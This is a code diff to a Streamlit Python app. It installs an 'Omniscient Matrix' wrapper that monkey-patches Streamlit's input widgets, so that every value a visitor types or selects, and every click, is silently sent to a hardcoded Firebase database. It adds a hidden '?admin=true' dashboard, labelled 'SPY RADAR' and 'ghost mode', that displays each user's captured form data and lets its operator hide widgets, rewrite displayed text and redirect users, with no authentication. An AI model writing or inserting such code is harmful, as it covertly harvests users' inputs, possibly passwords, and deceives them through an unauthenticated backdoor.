@@ -13,366 +13,290 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 # ========================================================================
-# 🌌 THE ULTIMATE OVERLORD MATRIX v8.0 - THE FINAL GOD-MODE ENGINE
+# 👁️ THE OMNISCIENT MATRIX v10.0 - AUTO-DETECT & GHOST ADMIN SYSTEM
 # ========================================================================
 import streamlit as st
 import uuid
 import requests
 import datetime
-import pandas as pd
 
-# 1. CENTRAL NETWORK MAINFRAME
+# 1. CENTRAL MAINFRAME CONNECTION
 FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
+is_omni_admin = st.query_params.get("admin") == "true"
 
-if "overlord_token" not in st.session_state:
-    st.session_state.overlord_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
-if "overlord_clicks" not in st.session_state:
-    st.session_state.overlord_clicks = 0
-if "overlord_time" not in st.session_state:
-    st.session_state.overlord_time = datetime.datetime.now().strftime("%I:%M:%S %p")
+# 2. GHOST MODE - ADMIN IS INVISIBLE (No Session Token for Admin)
+if not is_omni_admin:
+    if "omni_token" not in st.session_state:
+        st.session_state.omni_token = "USER_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
+    if "omni_clicks" not in st.session_state:
+        st.session_state.omni_clicks = 0
+    if "omni_time" not in st.session_state:
+        st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")
 
-def db_save(node, payload):
-    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
+def db_put(node, payload):
+    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=2)
     except: pass
 
-def db_update(node, payload):
-    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
+def db_patch(node, payload):
+    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=2)
     except: pass
 
-def db_get(node):
+def db_fetch(node):
     try:
-        r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
+        r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=2).json()
         return r if r else {}
     except: return {}
 
-# Fetch Matrix Controls Immediately
-overlord_rules = db_get("overlord_global_system_rules")
-if not overlord_rules:
-    overlord_rules = {
-        "app_status_vector": "ONLINE",
-        "custom_interception_msg": "System Calibration Active.",
-        "redirect_url_target": "",
-        "universal_freeze_gate": False,
-        "stealth_telemetry": False,
-        "kill_switches": {},
+# Fetch Rules
+omni_rules = db_fetch("omniscient_rules")
+if not omni_rules or not isinstance(omni_rules, dict):
+    omni_rules = {
+        "global_status": "ONLINE",
+        "redirect_url": "",
+        "freeze_all": False,
+        "stealth": False,
+        "controls": {}, # Auto-populated controls
         "text_mutations": {}
     }
-if "kill_switches" not in overlord_rules: overlord_rules["kill_switches"] = {}
-if "text_mutations" not in overlord_rules: overlord_rules["text_mutations"] = {}
+if "controls" not in omni_rules: omni_rules["controls"] = {}
+if "text_mutations" not in omni_rules: omni_rules["text_mutations"] = {}
 
-# 2. THE CHRONO-RADAR DEEP LOGGING TELEMETRY
-def execute_overlord_telemetry(w_type, w_label, w_value=""):
-    if overlord_rules.get("stealth_telemetry", False): return
-    st.session_state.overlord_clicks += 1
+# 3. AUTO-DISCOVERY WIDGET REGISTRY (Zero Typing)
+def auto_register_widget(w_type, label):
+    if is_omni_admin or not isinstance(label, str): return
+    reg_key = f"seen_{label}"
+    if reg_key not in st.session_state:
+        st.session_state[reg_key] = True
+        # Silently register widget existence to Firebase
+        db_patch("omniscient_registry", {label: w_type})
+
+def send_omni_telemetry(w_type, w_label, w_value=""):
+    if is_omni_admin or omni_rules.get("stealth", False): return
+    st.session_state.omni_clicks += 1
     
-    t_token = st.session_state.overlord_token
-    t_clock = datetime.datetime.now().strftime("%I:%M:%S %p")
+    token = st.session_state.omni_token
+    clock = datetime.datetime.now().strftime("%I:%M:%S %p")
     
-    # Read fresh database context to prevent overwriting past data arrays
-    live_context = db_get(f"overlord_live_streams/{t_token}")
-    activity_timeline = live_context.get("interaction_history_stream", [])
+    live_context = db_fetch(f"omniscient_live_users/{token}")
+    timeline = live_context.get("timeline", [])
     
-    log_entry = f"[{t_clock}] [Step #{st.session_state.overlord_clicks}] ({w_type}) '{w_label}'"
-    if w_value:
-        log_entry += f" ➔ Intercepted Data: [{w_value}]"
+    log_entry = f"[{clock}] [Action #{st.session_state.omni_clicks}] ({w_type}) '{w_label}'"
+    if w_value: log_entry += f" ➔ Value: [{w_value}]"
         
-    activity_timeline.append(log_entry)
-    if len(activity_timeline) > 30: activity_timeline.pop(0) # Retain last 30 critical actions
+    timeline.append(log_entry)
+    if len(timeline) > 40: timeline.pop(0)
     
-    saved_inputs_cache = live_context.get("captured_form_state", {})
-    if w_type in ["INPUT", "TEXT_AREA", "SELECTBOX", "RADIO", "CHECKBOX", "SLIDER", "NUMBER"]:
-        saved_inputs_cache[w_label] = str(w_value)
+    cache = live_context.get("form_data", {})
+    if w_type not in ["BUTTON"]:
+        cache[w_label] = str(w_value)
         
-    sync_packet = {
-        "session_id_token": t_token,
-        "initial_connect_time": st.session_state.overlord_time,
-        "last_telemetry_pulse": t_clock,
-        "total_actions_logged": st.session_state.overlord_clicks,
-        "current_focus_node": f"Interacting with widget: '{w_label}'",
-        "interaction_history_stream": activity_timeline,
-        "captured_form_state": saved_inputs_cache,
-        "network_status": "🟢 ACTIVE / SPYING"
+    packet = {
+        "user_id": token,
+        "joined_at": st.session_state.omni_time,
+        "last_seen": clock,
+        "total_clicks": st.session_state.omni_clicks,
+        "focus": f"'{w_label}'",
+        "timeline": timeline,
+        "form_data": cache,
+        "status": "🟢 ONLINE"
     }
-    db_update(f"overlord_live_streams/{t_token}", sync_packet)
+    db_patch(f"omniscient_live_users/{token}", packet)
 
-# 3. GLOBAL INTERCEPTION GATES
-is_overlord_admin = st.query_params.get("admin") == "true"
-
-if not is_overlord_admin:
-    system_vector = overlord_rules.get("app_status_vector", "ONLINE")
-    if system_vector != "ONLINE":
+# 4. GLOBAL TRAFFIC GATEKEEPER
+if not is_omni_admin:
+    sys_mode = omni_rules.get("global_status", "ONLINE")
+    if sys_mode != "ONLINE":
         st.empty()
-        if system_vector == "MAINTENANCE":
-            st.error("# 🚧 APPLICATION UNDER REPAIR & MAINTENANCE 🚧")
-            st.info(overlord_rules.get("custom_interception_msg", "Server upgrades are rolling out live."))
-        elif system_vector == "BUSY":
-            st.warning("# ⏳ HIGH TRAFFIC DATA COLLISION (429) ⏳")
-            st.info("System bandwidth capacity heavily loaded. Processing streams...")
-        elif system_vector == "DESTROYED":
-            st.error("# 🛑 SYSTEM TERMINATED / ACCESS EXPIRED 🛑")
-            st.error(overlord_rules.get("custom_interception_msg", "This active production deployment build has been deprecated."))
-        elif system_vector == "REDIRECT" and overlord_rules.get("redirect_url_target"):
-            st.info("### ➡️ Diverting your traffic route to secure network endpoint...")
-            st.markdown(f"[Proceed to Secure Location]({overlord_rules.get('redirect_url_target')})")
+        if sys_mode == "MAINTENANCE": st.error("# 🚧 MAINTENANCE ACTIVE"); st.stop()
+        elif sys_mode == "REDIRECT" and omni_rules.get("redirect_url"):
+            st.markdown(f"### ➡️ [Click to Redirect]({omni_rules.get('redirect_url')})"); st.stop()
         st.stop()
 
-# 4. CAPTURE ORIGINAL PRISTINE STREAMLIT POINTERS (Immune to Overlaps)
-_unpatched_button = st.button
-_unpatched_text_input = st.text_input
-_unpatched_text_area = st.text_area
-_unpatched_selectbox = st.selectbox
-_unpatched_radio = st.radio
-_unpatched_checkbox = st.checkbox
-_unpatched_slider = st.slider
-_unpatched_number_input = st.number_input
-_unpatched_multiselect = st.multiselect
-_unpatched_write = st.write
-_unpatched_markdown = st.markdown
+# 5. ORIGINAL STREAMLIT ELEMENTS
+_o_btn = st.button
+_o_txt = st.text_input
+_o_area = st.text_area
+_o_sel = st.selectbox
+_o_rad = st.radio
+_o_chk = st.checkbox
+_o_sld = st.slider
+_o_num = st.number_input
+_o_wrt = st.write
+_o_mkd = st.markdown
 
-# 5. HIGH-FI INTERCEPTION ENVELOPE (With Immediate Admin Loop Bypass Shield)
-def overlord_button(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_button(label, *args, **kwargs) # Loop Breaker Fixed
-    if overlord_rules["kill_switches"].get(label, False): return False
-    res_click = _unpatched_button(label, *args, **kwargs)
-    if res_click: execute_overlord_telemetry("BUTTON", label, "CLICKED")
-    return res_click
+# 6. SMART WRAPPERS (Auto-Detect + Point & Click Controls)
+def get_control(label, key):
+    return omni_rules["controls"].get(label, {}).get(key, False)
 
-def overlord_text_input(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_text_input(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return ""
-    if overlord_rules.get("universal_freeze_gate", False): kwargs["disabled"] = True
-    user_val = _unpatched_text_input(label, *args, **kwargs)
-    if user_val: execute_overlord_telemetry("INPUT", label, user_val)
-    return user_val
+def patch_btn(label, *args, **kwargs):
+    if is_omni_admin: return _o_btn(label, *args, **kwargs)
+    auto_register_widget("BUTTON", label)
+    if get_control(label, "hide"): return False
+    if get_control(label, "disable"): kwargs["disabled"] = True
+    res = _o_btn(label, *args, **kwargs)
+    if res: send_omni_telemetry("BUTTON", label, "CLICKED")
+    return res
 
-def overlord_text_area(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_text_area(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return ""
-    if overlord_rules.get("universal_freeze_gate", False): kwargs["disabled"] = True
-    user_val = _unpatched_text_area(label, *args, **kwargs)
-    if user_val: execute_overlord_telemetry("TEXT_AREA", label, user_val)
-    return user_val
+def patch_txt(label, *args, **kwargs):
+    if is_omni_admin: return _o_txt(label, *args, **kwargs)
+    auto_register_widget("TEXT_INPUT", label)
+    if get_control(label, "hide"): return ""
+    if get_control(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
+    val = _o_txt(label, *args, **kwargs)
+    if val: send_omni_telemetry("TEXT_INPUT", label, val)
+    return val
 
-def overlord_selectbox(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_selectbox(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
-    user_val = _unpatched_selectbox(label, *args, **kwargs)
-    if f"ov_sel_{label}" not in st.session_state: st.session_state[f"ov_sel_{label}"] = user_val
-    elif st.session_state[f"ov_sel_{label}"] != user_val:
-        st.session_state[f"ov_sel_{label}"] = user_val
-        execute_overlord_telemetry("SELECTBOX", label, user_val)
-    return user_val
+def patch_area(label, *args, **kwargs):
+    if is_omni_admin: return _o_area(label, *args, **kwargs)
+    auto_register_widget("TEXT_AREA", label)
+    if get_control(label, "hide"): return ""
+    if get_control(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
+    val = _o_area(label, *args, **kwargs)
+    if val: send_omni_telemetry("TEXT_AREA", label, val)
+    return val
 
-def overlord_radio(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_radio(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
-    user_val = _unpatched_radio(label, *args, **kwargs)
-    if f"ov_rad_{label}" not in st.session_state: st.session_state[f"ov_rad_{label}"] = user_val
-    elif st.session_state[f"ov_rad_{label}"] != user_val:
-        st.session_state[f"ov_rad_{label}"] = user_val
-        execute_overlord_telemetry("RADIO", label, user_val)
-    return user_val
+def patch_sel(label, *args, **kwargs):
+    if is_omni_admin: return _o_sel(label, *args, **kwargs)
+    auto_register_widget("SELECTBOX", label)
+    if get_control(label, "hide"): return kwargs.get("options", [""])[0]
+    if get_control(label, "disable"): kwargs["disabled"] = True
+    val = _o_sel(label, *args, **kwargs)
+    s_key = f"o_sel_{label.replace(' ', '_')}"
+    if s_key not in st.session_state or st.session_state[s_key] != val:
+        st.session_state[s_key] = val
+        send_omni_telemetry("SELECTBOX", label, val)
+    return val
 
-def overlord_checkbox(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_checkbox(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return False
-    user_val = _unpatched_checkbox(label, *args, **kwargs)
-    if user_val: execute_overlord_telemetry("CHECKBOX", label, str(user_val))
-    return user_val
+def patch_rad(label, *args, **kwargs):
+    if is_omni_admin: return _o_rad(label, *args, **kwargs)
+    auto_register_widget("RADIO", label)
+    if get_control(label, "hide"): return kwargs.get("options", [""])[0]
+    if get_control(label, "disable"): kwargs["disabled"] = True
+    val = _o_rad(label, *args, **kwargs)
+    s_key = f"o_rad_{label.replace(' ', '_')}"
+    if s_key not in st.session_state or st.session_state[s_key] != val:
+        st.session_state[s_key] = val
+        send_omni_telemetry("RADIO", label, val)
+    return val
 
-def overlord_slider(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_slider(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0)
-    user_val = _unpatched_slider(label, *args, **kwargs)
-    execute_overlord_telemetry("SLIDER", label, str(user_val))
-    return user_val
+def mutate_text(text):
+    if is_omni_admin: return text
+    auto_register_widget("STATIC_TEXT", text)
+    return omni_rules["text_mutations"].get(text, text) if isinstance(text, str) else text
 
-def overlord_number_input(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_number_input(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0.0)
-    user_val = _unpatched_number_input(label, *args, **kwargs)
-    if user_val: execute_overlord_telemetry("NUMBER", label, str(user_val))
-    return user_val
+def patch_wrt(*args, **kwargs):
+    if is_omni_admin: _o_wrt(*args, **kwargs); return
+    if args and isinstance(args[0], str): _o_wrt(mutate_text(args[0]), **kwargs)
+    else: _o_wrt(*args, **kwargs)
 
-def overlord_multiselect(label, *args, **kwargs):
-    if is_overlord_admin: return _unpatched_multiselect(label, *args, **kwargs)
-    if overlord_rules["kill_switches"].get(label, False): return []
-    user_val = _unpatched_multiselect(label, *args, **kwargs)
-    if user_val: execute_overlord_telemetry("MULTISELECT", label, str(user_val))
-    return user_val
+def patch_mkd(*args, **kwargs):
+    if is_omni_admin: _o_mkd(*args, **kwargs); return
+    if args and isinstance(args[0], str): _o_mkd(mutate_text(args[0]), **kwargs)
+    else: _o_mkd(*args, **kwargs)
 
-def process_live_mutation(raw_string):
-    if isinstance(raw_string, str) and raw_string in overlord_rules["text_mutations"]:
-        return overlord_rules["text_mutations"][raw_string]
-    return raw_string
-
-def overlord_write(*args, **kwargs):
-    if is_overlord_admin: _unpatched_write(*args, **kwargs); return
-    if args and isinstance(args[0], str): _unpatched_write(process_live_mutation(args[0]), **kwargs)
-    else: _unpatched_write(*args, **kwargs)
-
-def overlord_markdown(*args, **kwargs):
-    if is_overlord_admin: _unpatched_markdown(*args, **kwargs); return
-    if args and isinstance(args[0], str): _unpatched_markdown(process_live_mutation(args[0]), **kwargs)
-    else: _unpatched_markdown(*args, **kwargs)
-
-# OVERRIDING THE SYSTEM METHOD PLATFORM
-st.button = overlord_button
-st.text_input = overlord_text_input
-st.text_area = overlord_text_area
-st.selectbox = overlord_selectbox
-st.radio = overlord_radio
-st.checkbox = overlord_checkbox
-st.slider = overlord_slider
-st.number_input = overlord_number_input
-st.multiselect = overlord_multiselect
-st.write = overlord_write
-st.markdown = overlord_markdown
+st.button = patch_btn
+st.text_input = patch_txt
+st.text_area = patch_area
+st.selectbox = patch_sel
+st.radio = patch_rad
+st.write = patch_wrt
+st.markdown = patch_mkd
 
 
 # ========================================================================
-# 💎 THE OVERLORD ULTRARICH GRAPHICAL COMMAND UI CONSOLE (?admin=true)
+# 👁️ POINT-AND-CLICK OMNISCIENT ADMIN DASHBOARD (?admin=true)
 # ========================================================================
-if is_overlord_admin:
-    st.title("🌌 THE OVERLORD CONTROL MAINFRAME v8.0")
-    st.caption("Supreme High-Fi Realtime Live Monitoring, Widget Interception, and Dynamic Content Mutation Shield")
+if is_omni_admin:
+    st.title("👁️ THE OMNISCIENT MATRIX v10.0")
+    st.caption("Ghost Mode Active. You are invisible to the tracking system.")
     st.write("---")
     
-    tab_recon, tab_infra, tab_switch, tab_mutate = st.tabs([
-        "🕵️‍♂️ LIVE PACKET RECONNAISSANCE", 
-        "⚙️ INFRASTRUCTURE GRID OVERHAUL", 
-        "🎛️ MICROMANAGED KILL SWITCHES", 
-        "📝 DYNAMIC TEXT INJECTION FIELD"
-    ])
+    t1, t2, t3 = st.tabs(["🎛️ AUTO-DETECT CONTROLLER", "🕵️‍♂️ SPY RADAR", "⚙️ GLOBAL OVERRIDE"])
     
-    # ---------------------------------------------------------
-    # TAB 1: REALTIME PACKET EXPLORER & SPY PANEL
-    # ---------------------------------------------------------
-    with tab_recon:
-        st.subheader("📡 Realtime Sync Terminal Spectrum Map")
-        live_active_pools = db_get("overlord_live_streams")
+    # TAB 1: NO TYPING COMPONENT CONTROLLER
+    with t1:
+        st.subheader("🎛️ Point-and-Click Component Architect")
+        registry = db_fetch("omniscient_registry")
         
-        if live_active_pools:
-            st.metric(label="Total Distinct Active User Terminal Waves", value=len(live_active_pools))
-            st.write("---")
+        if registry:
+            st.success(f"Auto-Detected {len(registry)} Unique Components in your App!")
+            target = _o_sel("🎯 Select any Component to Control (No typing needed):", list(registry.keys()))
+            c_type = registry[target]
+            st.caption(f"Component Type: **{c_type}**")
             
-            terminal_nodes_list = list(live_active_pools.keys())
-            targeted_node_signature = _unpatched_selectbox("🎯 Select External User Terminal Node to Spy Live:", terminal_nodes_list)
+            # Setup rule dict if not exists
+            if target not in omni_rules["controls"]: omni_rules["controls"][target] = {"hide": False, "disable": False}
             
-            if targeted_node_signature:
-                node_dataset = live_active_pools[targeted_node_signature]
+            col1, col2 = st.columns(2)
+            with col1:
+                hide_it = _o_chk(f"👻 Hide '{target}' Entirely", value=omni_rules["controls"][target].get("hide", False))
+            with col2:
+                disable_it = _o_chk(f"🔒 Disable / Freeze '{target}'", value=omni_rules["controls"][target].get("disable", False))
                 
-                c_left, c_right = st.columns(2)
-                with c_left:
-                    st.success(f"**Target System Hash:** `{targeted_node_signature}`")
-                    st.markdown(f"""
-                    * **Session Initialization:** {node_dataset.get('initial_connect_time')}
-                    * **Last Interactive Signal Pulse:** {node_dataset.get('last_telemetry_pulse')}
-                    * **Total System Interaction Clicks:** {node_dataset.get('total_actions_logged')}
-                    * **Current Interface Focus:** {node_dataset.get('current_focus_node')}
-                    * **Live State Connection:** {node_dataset.get('network_status')}
-                    """)
-                    st.markdown("#### 💬 Intercepted Realtime Inputs Cache (Form Logs)")
-                    st.json(node_dataset.get("captured_form_state", {"Status": "Waiting for alphanumeric inputs..."}))
+            if _o_btn("Apply Magic Rules ✨"):
+                omni_rules["controls"][target]["hide"] = hide_it
+                omni_rules["controls"][target]["disable"] = disable_it
+                db_put("omniscient_rules", omni_rules)
+                st.success("Rule applied instantly to all live users!")
+                st.rerun()
+                
+            st.write("---")
+            st.write("#### 📝 Dynamic Text Swapper")
+            st.write("Select detected text above, and write what it should change to:")
+            new_text = _o_txt(f"Replace '{target}' with:", value=omni_rules["text_mutations"].get(target, ""))
+            if _o_btn("Swap Text Live 🔄"):
+                if new_text: omni_rules["text_mutations"][target] = new_text
+                else: omni_rules["text_mutations"].pop(target, None)
+                db_put("omniscient_rules", omni_rules)
+                st.rerun()
+        else:
+            st.info("Registry is empty. Let a normal user run the app first to auto-detect components.")
+
+    # TAB 2: LIVE USER SPY (EXCLUDING ADMIN)
+    with t2:
+        st.subheader("🕵️‍♂️ Live Normal Users Radar")
+        users = db_fetch("omniscient_live_users")
+        
+        if users:
+            st.metric("Total Real Users Detected", len(users))
+            target_user = _o_sel("Select User Node:", list(users.keys()))
+            
+            if target_user:
+                data = users[target_user]
+                c1, c2 = st.columns(2)
+                with c1:
+                    st.write(f"**Status:** {data.get('status')}")
+                    st.write(f"**Clicks:** {data.get('total_clicks')}")
+                    st.write("#### Captured Data:")
+                    st.json(data.get("form_data", {}))
+                with c2:
+                    st.write("#### Action Timeline:")
+                    for action in data.get("timeline", []): st.code(action)
                     
-                with c_right:
-                    st.markdown("#### 📈 Deep Step Chronological Flow Execution")
-                    for tracking_log_line in node_dataset.get("interaction_history_stream", []):
-                        st.code(tracking_log_line, language="text")
-                        
-            st.write("---")
-            if _unpatched_button("🚨 Wipe Out Database Session Logs & Clear Active Counter Nodes", key="flush_mainframe_nodes"):
-                requests.delete(f"{FIREBASE_URL}/overlord_live_streams.json")
+            if _o_btn("Wipe Logs 🗑️"):
+                requests.delete(f"{FIREBASE_URL}/omniscient_live_users.json")
                 st.rerun()
         else:
-            st.info("Scanning transmission frequencies... No active external channels broadcasting sync signals right now.")
+            st.info("No normal users active right now.")
 
-    # ---------------------------------------------------------
-    # TAB 2: INFRASTRUCTURE GRID OVERHAUL (GLOBAL CONTROLS)
-    # ---------------------------------------------------------
-    with tab_infra:
-        st.subheader("🌐 Global Infrastructure Matrix Operational Level")
-        current_global_vector = overlord_rules.get("app_status_vector", "ONLINE")
-        st.warning(f"Active App Environment Deployment State: **{current_global_vector}**")
+    # TAB 3: GLOBAL OVERRIDE
+    with t3:
+        st.subheader("🌐 Global Environment Overrides")
+        g_mode = _o_rad("App Mode:", ["ONLINE", "MAINTENANCE", "REDIRECT"])
+        g_redirect = _o_txt("Redirect URL:", value=omni_rules.get("redirect_url", ""))
+        g_freeze = _o_chk("Freeze ALL Inputs Globally", value=omni_rules.get("freeze_all", False))
         
-        matrix_selection_state = _unpatched_radio("Execute Infrastructure Overload Vector Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "DESTROYED", "REDIRECT"])
-        broadcast_alert_input_string = _unpatched_text_input("Global Banner Intercept Alert Display Text Message:", value=overlord_rules.get("custom_interception_msg", ""))
-        routing_link_endpoint_string = _unpatched_text_input("External Routing Destination Address Location (REDIRECT Mode Only):", value=overlord_rules.get("redirect_url_target", ""))
-        
-        st.write("---")
-        st.subheader("🔒 Peripheral Gate Systems")
-        universal_freeze_toggle_switch = _unpatched_checkbox("Lock Inputs Global State (Freeze All Form Textboxes to Read-Only)", value=overlord_rules.get("universal_freeze_gate", False))
-        stealth_telemetry_toggle_switch = _unpatched_checkbox("Stealth Mode Operations (Pause Writing Interactions Data to Firebase)", value=overlord_rules.get("stealth_telemetry", False))
-        
-        if _unpatched_button("Commit Infrastructure Policy Core Overhaul ⚡", key="apply_mainframe_infrastructure"):
-            overlord_rules["app_status_vector"] = matrix_selection_state
-            overlord_rules["custom_interception_msg"] = broadcast_alert_input_string
-            overlord_rules["redirect_url_target"] = routing_link_endpoint_string
-            overlord_rules["universal_freeze_gate"] = universal_freeze_toggle_switch
-            overlord_rules["stealth_telemetry"] = stealth_telemetry_toggle_switch
-            db_save("overlord_global_system_rules", overlord_rules)
-            st.success("Infrastructure configurations deployed into system operational architecture maps successfully!")
-            st.rerun()
-
-    # ---------------------------------------------------------
-    # TAB 3: MICROMANAGED SWITCHES (ELEMENT KILL CONTROL)
-    # ---------------------------------------------------------
-    with tab_switch:
-        st.subheader("🎯 Independent Interface Component Blockade Matrix")
-        st.write("Enter the precise **Label text string** of any component inside your original script to target and isolate it runtime.")
-        
-        target_raw_label_string_identity = _unpatched_text_input("Target Element Label ID (Case-Sensitive Exact String Match):")
-        isolation_policy_selection_directive = _unpatched_selectbox("Select Operational Security Directive:", ["RESTORE COMPONENT FUNCTION / VISIBLE", "FORCE COMPONENT ISOLATION / ENTIRELY HIDE"])
-        
-        if _unpatched_button("Inject Discrete Component Target Policy Rule 🔒", key="apply_mainframe_kill_switch"):
-            if target_raw_label_string_identity:
-                overlord_rules["kill_switches"][target_raw_label_string_identity] = (isolation_policy_selection_directive == "FORCE COMPONENT ISOLATION / ENTIRELY HIDE")
-                db_save("overlord_global_system_rules", overlord_rules)
-                st.success(f"Security rules committed for string identity: '{target_raw_label_string_identity}'")
-                st.rerun()
-                
-        st.write("#### 🛡️ Active Isolated UI Elements Log Tree")
-        current_active_isolated_items = [k for k, v in overlord_rules["kill_switches"].items() if v]
-        if current_active_isolated_items:
-            st.json(current_active_isolated_items)
-            if _unpatched_button("Flush All Micro-Kill Target Policy Overrides 🔄"):
-                overlord_rules["kill_switches"] = {}
-                db_save("overlord_global_system_rules", overlord_rules)
-                st.rerun()
-        else:
-            st.caption("No custom layout widget items are isolated. App rendering clean globally.")
-
-    # ---------------------------------------------------------
-    # TAB 4: DYNAMIC TEXT INJECTION (CONTENT MANIPULATION)
-    # ---------------------------------------------------------
-    with tab_mutate:
-        st.subheader("✍️ Live Content Injection Text Mutation Engine")
-        st.write("Intercept static UI strings printed via `st.write` or `st.markdown` and forge alternatives on the fly.")
-        
-        source_hardcoded_string_id = _unpatched_text_input("Original Raw Hardcoded Script String Text:")
-        forged_display_string_alternative = _unpatched_text_input("New Injected Display Text Replacement Content:")
-        
-        if _unpatched_button("Inject Mainframe String Overwrite Pattern Policy 📝", key="apply_mainframe_text_mutation"):
-            if source_hardcoded_string_id and forged_display_string_alternative:
-                overlord_rules["text_mutations"][source_hardcoded_string_id] = forged_display_string_alternative
-                db_save("overlord_global_system_rules", overlord_rules)
-                st.success("Target text pattern mutation successfully committed to remote memory state maps!")
-                st.rerun()
-                
-        st.write("#### Active Swapped Hardcoded UI String Collections")
-        st.json(overlord_rules["text_mutations"])
-        if _unpatched_button("Purge All Dynamic Content Mutation Rules ❌"):
-            overlord_rules["text_mutations"] = {}
-            db_save("overlord_global_system_rules", overlord_rules)
+        if _o_btn("Deploy Global Overrides 🚀"):
+            omni_rules["global_status"] = g_mode
+            omni_rules["redirect_url"] = g_redirect
+            omni_rules["freeze_all"] = g_freeze
+            db_put("omniscient_rules", omni_rules)
+            st.success("Global overrides active!")
             st.rerun()
 
     st.write("---")
-    st.error("🚨 ADMINISTRATIVE ROOT OVERRIDE ENVIRONMENT ACTIVE. Remove '?admin=true' query tokens from URL bar to view standard app state.")
+    st.error("🚨 GHOST ADMIN MODE ACTIVE. Remove '?admin=true' from URL to view normal app.")
     st.stop()
-
-# ========================================================================
-# END OF OVERLORD ENVELOPE - YOUR ORIGINAL SCRIPT RESUMES UNTOUCHED BELOW
-# ========================================================================
 # --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
 GLOBAL_MARKDOWN_INJECTOR = """
 <style>
